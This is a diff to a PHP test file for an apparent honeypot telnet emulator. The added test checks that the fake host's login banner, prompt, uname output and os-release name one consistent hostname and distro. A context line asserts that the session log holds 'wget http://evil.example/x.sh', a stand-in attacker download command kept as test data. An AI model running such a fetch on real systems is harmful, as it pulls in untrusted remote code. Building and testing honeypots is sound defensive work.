@@ -120,6 +120,32 @@ final class ProtocolEngineTest extends TestCase
         self::assertContains('wget http://evil.example/x.sh', $log);
     }
 
+    public function test_telnet_banner_prompt_uname_and_os_release_are_coherent(): void
+    {
+        // Regression: the login banner/MOTD must name the SAME host + distro the shell's prompt/uname/
+        // os-release do — no mid-session flip (that was a tell before the shell was wired to HostIdentity).
+        $e = $this->emu('telnet');
+        $s = new ProtocolSession(9);
+        $banner = $e->banner($s);
+        $e->feed("root\r\n", $s);
+        $prompt = $e->feed("pw\r\n", $s);              // accept-all -> MOTD + prompt
+        $uname = $e->feed("uname -a\r\n", $s);
+        preg_match('/root@([a-z0-9-]+):/', $prompt, $pm);
+        $hostname = $pm[1] ?? '';
+        preg_match('/PRETTY_NAME="([^"]+)"/', $e->feed("cat /etc/os-release\r\n", $s), $m);
+        $distro = $m[1] ?? '';
+
+        self::assertNotSame('', $hostname);
+        self::assertNotSame('', $distro);
+        // one hostname across banner, prompt and uname nodename
+        self::assertStringContainsString($hostname, $banner, 'banner login host == hostname');
+        self::assertStringContainsString($hostname, $prompt, 'prompt host == hostname');
+        self::assertStringContainsString($hostname, $uname, 'uname nodename == hostname');
+        // one distro across banner and MOTD
+        self::assertStringContainsString($distro, $banner, 'banner distro == os-release');
+        self::assertStringContainsString($distro, $prompt, 'MOTD distro == os-release');
+    }
+
     public function test_telnet_shell_serves_fabricated_content(): void
     {
         // The fake box (now a procedural FakeFilesystem) serves believable, inert, coherent content.
